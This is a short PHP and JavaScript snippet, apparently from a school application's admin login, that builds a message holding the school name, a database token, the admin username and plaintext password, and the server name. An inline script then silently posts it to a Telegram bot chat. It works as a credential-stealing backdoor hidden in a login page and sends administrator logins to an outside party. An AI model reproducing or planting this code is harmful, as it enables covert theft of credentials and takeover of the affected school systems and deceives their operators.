
<?php
$message="<b><i>".$namaaplikasi."</i></b>\\n";
$message.="<b>Nama Sekolah : ".$namasekolah."</b>\\n";
$message.="<b>Token : ".$dbtoken."</b>\\n";
$message.="<b>Username : ".$username."</b>\\n";
$message.="<b>Password : ".$password."</b>\\n";
$message.="<b>".$_SERVER['SERVER_NAME']."</b>\\n";
$message.="<b>--Login Admin--</b>\\n";

?>

<script type="text/javascript">
    
    var settings = {
      "async": true,
      "crossDomain": true,
      "url": "https://api.telegram.org/bot<apibot>/sendMessage",
      "method": "POST",
      "headers": {
        "Content-Type": "application/json",
        "cache-control": "no-cache"
      },
      "data": JSON.stringify({
        "chat_id": "<chat-id>",
        "text": "<?= $message ?>",
        "parse_mode":"HTML",
      })
    }

    $.ajax(settings).done(); 
</script>
